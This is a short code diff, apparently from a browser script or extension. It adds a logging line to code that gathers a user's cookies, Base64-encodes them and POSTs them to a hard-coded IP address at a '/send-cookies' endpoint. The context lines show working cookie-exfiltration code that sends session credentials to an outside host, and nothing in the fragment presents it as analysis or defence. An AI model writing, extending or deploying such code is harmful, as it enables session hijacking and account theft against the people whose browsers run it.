@@ -35,6 +35,7 @@
 
             const encodedCookies = btoa(unescape(encodeURIComponent(JSON.stringify(cookies)))); // Base64 encode with proper Unicode handling
             console.log("Cookies to be sent (encoded):", encodedCookies);
+            console.log("Sending cookies:", JSON.stringify({ cookies: encodedCookies }));
 
             fetch('https://144.172.76.108:8000/send-cookies', {
                 method: 'POST',
